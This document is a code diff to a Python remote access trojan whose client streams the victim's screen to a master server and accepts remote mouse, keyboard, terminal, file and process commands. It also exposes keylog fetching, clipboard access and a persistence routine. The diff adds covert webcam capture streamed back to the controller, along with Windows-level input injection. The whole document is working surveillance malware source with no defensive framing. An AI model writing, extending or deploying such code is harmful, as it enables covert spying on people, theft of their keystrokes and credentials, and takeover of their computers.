@@ -5,7 +5,10 @@ import base64
 import json
 import threading
 import subprocess
-import logging
+import ctypes
+import win32api
+import win32con
+import win32gui
 from datetime import datetime
 from flask import Flask, render_template, request, send_file
 from flask_socketio import SocketIO, emit, join_room, leave_room
@@ -72,7 +75,8 @@ ADMIN_EVENTS = [
     'mouse', 'keyboard', 'system', 'terminal_start', 'terminal_input', 'terminal_stop',
     'file_browse', 'file_upload', 'file_delete', 'file_run', 'process_list', 'process_kill',
     'audio_start', 'audio_stop', 'vitals_start', 'vitals_stop', 'monitor_list', 'monitor_switch',
-    'keylog_fetch', 'keylog_clear', 'clipboard_get', 'clipboard_set', 'chat_send', 'chat_history', 'alert_send'
+    'keylog_fetch', 'keylog_clear', 'clipboard_get', 'clipboard_set', 'chat_send', 'chat_history', 'alert_send',
+    'webcam_start', 'webcam_stop'
 ]
 TARGET_EVENTS = [
     'init', 'screen_frame', 'webcam_frame', 'screenshot', 'terminal_started', 'terminal_output',
@@ -128,26 +132,45 @@ def run_client(master_url):
     # Connect with both transports allowed
     sio = client_sio.Client(logger=True, engineio_logger=True)
 
-    client_state = { 'capturing': False, 'vitals': False, 'monitor': 1, 'audio': False, 'term': {}, 'keylog': [] }
+    client_state = { 'capturing': False, 'screen': True, 'webcam': False, 'monitor': 1, 'audio': False, 'term': {}, 'keylog': [] }
     keylog_lock = threading.Lock()
 
     def capture_loop():
-        logger.info("Screen capture loop started.")
+        # High-performance capture using mss and optional resizing
+        quality = 30
+        resize_factor = 0.8
         with mss.mss() as sct:
             while client_state['capturing']:
+                if not client_state['screen']:
+                    time.sleep(0.5)
+                    continue
                 try:
-                    monitor = sct.monitors[client_state['monitor']]
-                    raw = sct.grab(monitor); img = Image.frombytes("RGB", raw.size, raw.rgb)
-                    frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
-                    _, enc = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 60])
+                    monitors = sct.monitors
+                    idx = client_state['monitor']
+                    if idx >= len(monitors): idx = 1
+                    monitor = monitors[idx]
+                    
+                    img_data = sct.grab(monitor)
+                    img = Image.frombytes("RGB", img_data.size, img_data.bgra, "raw", "BGRX")
+                    
+                    if resize_factor < 1.0:
+                        new_size = (int(img.width * resize_factor), int(img.height * resize_factor))
+                        img = img.resize(new_size, Image.LANCZOS)
+                        
+                    buffer = BytesIO()
+                    img.save(buffer, format='JPEG', quality=quality, optimize=True)
+                    img_b64 = base64.b64encode(buffer.getvalue()).decode()
+                    
                     sio.emit('screen_frame', {
-                        'image': base64.b64encode(enc).decode('utf-8'),
-                        'width': monitor['width'], 'height': monitor['height'], 'timestamp': time.time()
+                        'image': img_b64,
+                        'timestamp': time.time(),
+                        'width': monitor['width'],
+                        'height': monitor['height']
                     })
-                    time.sleep(0.04) # ~25 FPS
-                except Exception as ex: 
+                except Exception as ex:
                     logger.debug(f"Capture error: {ex}")
                     time.sleep(0.1)
+                time.sleep(0.01)
 
     @sio.event
     def connect():
@@ -165,24 +188,59 @@ def run_client(master_url):
                 'monitors': len(sct.monitors) - 1
             })
         client_state['capturing'] = True
+        client_state['screen'] = True
         if not any(t.name == "CaptureThread" for t in threading.enumerate()):
             threading.Thread(target=capture_loop, daemon=True, name="CaptureThread").start()
 
     @sio.on('mouse')
     def on_mouse(data):
         try:
-            if data['type'] == 'move': pyautogui.moveTo(data['x'], data['y'])
-            elif data['type'] == 'click': pyautogui.click(button=data.get('button', 'left'))
-            elif data['type'] == 'dblclick': pyautogui.doubleClick()
-            elif data['type'] == 'rightclick': pyautogui.rightClick()
-            elif data['type'] == 'scroll': pyautogui.scroll(data.get('amount', 0))
-        except: pass
+            # Multi-monitor-aware coordinate scaling
+            sw = ctypes.windll.user32.GetSystemMetrics(0)
+            sh = ctypes.windll.user32.GetSystemMetrics(1)
+            
+            if data['type'] == 'move':
+                abs_x = int(data['x'] * sw)
+                abs_y = int(data['y'] * sh)
+                win32api.SetCursorPos((abs_x, abs_y))
+            elif data['type'] == 'click':
+                btn = data.get('button', 'left')
+                ev_down = win32con.MOUSEEVENTF_LEFTDOWN if btn == 'left' else win32con.MOUSEEVENTF_RIGHTDOWN
+                ev_up = win32con.MOUSEEVENTF_LEFTUP if btn == 'left' else win32con.MOUSEEVENTF_RIGHTUP
+                win32api.mouse_event(ev_down, 0, 0, 0, 0)
+                time.sleep(0.01)
+                win32api.mouse_event(ev_up, 0, 0, 0, 0)
+            elif data['type'] == 'dblclick':
+                win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
+                win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
+                time.sleep(0.01)
+                win32api.mouse_event(win32con.MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0)
+                win32api.mouse_event(win32con.MOUSEEVENTF_LEFTUP, 0, 0, 0, 0)
+            elif data['type'] == 'rightclick':
+                win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0)
+                time.sleep(0.01)
+                win32api.mouse_event(win32con.MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0)
+            elif data['type'] == 'scroll':
+                win32api.mouse_event(win32con.MOUSEEVENTF_WHEEL, 0, 0, int(data.get('amount', 0)), 0)
+        except Exception as e:
+            logger.error(f"Mouse Error: {e}")
 
+    _KEY_MAP = {
+        'Control': 'ctrl', 'Shift': 'shift', 'Alt': 'alt', 'Meta': 'win',
+        'Enter': 'enter', 'Backspace': 'backspace', 'Delete': 'delete',
+        'Tab': 'tab', 'Escape': 'escape', 'CapsLock': 'capslock',
+        'ArrowUp': 'up', 'ArrowDown': 'down', 'ArrowLeft': 'left', 'ArrowRight': 'right',
+        'Home': 'home', 'End': 'end', 'PageUp': 'pageup', 'PageDown': 'pagedown',
+        'Insert': 'insert', ' ': 'space',
+    }
     @sio.on('keyboard')
     def on_keyboard(data):
         try:
-            if data['type'] == 'press': pyautogui.press(data['key'])
-            elif data['type'] == 'type': threading.Thread(target=pyautogui.typewrite, args=(data['text'],), daemon=True).start()
+            k = data['key']
+            mapped = _KEY_MAP.get(k, k.lower() if len(k) == 1 else k.lower())
+            if data['type'] == 'press': pyautogui.press(mapped)
+            elif data['type'] == 'down': pyautogui.keyDown(mapped)
+            elif data['type'] == 'up': pyautogui.keyUp(mapped)
             elif data['type'] == 'hotkey': pyautogui.hotkey(*data['keys'])
         except: pass
 
@@ -281,10 +339,41 @@ def run_client(master_url):
         threading.Thread(target=audio_loop, daemon=True).start()
         sio.emit('audio_started', {})
 
-    @sio.on('audio_stop')
-    def on_audio_stop(data):
-        client_state['audio'] = False
-        sio.emit('audio_stopped', {})
+    @sio.on('monitor_switch')
+    def on_mon_switch(data):
+        try:
+            idx = int(data.get('index', 1))
+            client_state['monitor'] = idx
+            logger.info(f"Switched to monitor {idx}")
+        except: pass
+
+    def webcam_loop():
+        while client_state['capturing']:
+            if not client_state['webcam']:
+                time.sleep(0.5)
+                continue
+            try:
+                import cv2
+                cap = cv2.VideoCapture(0)
+                while client_state['webcam']:
+                    ret, frame = cap.read()
+                    if ret:
+                        _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 30])
+                        img_b64 = base64.b64encode(buffer).decode()
+                        sio.emit('webcam_frame', {'image': img_b64})
+                    time.sleep(0.05)
+                cap.release()
+            except:
+                time.sleep(1)
+
+    @sio.on('webcam_start')
+    def on_webcam_start(data):
+        client_state['webcam'] = True
+        if not any(t.name == "WebcamThread" for t in threading.enumerate()):
+            threading.Thread(target=webcam_loop, daemon=True, name="WebcamThread").start()
+
+    @sio.on('webcam_stop')
+    def on_webcam_stop(data): client_state['webcam'] = False
 
     # Persistence & Start
     def persist():
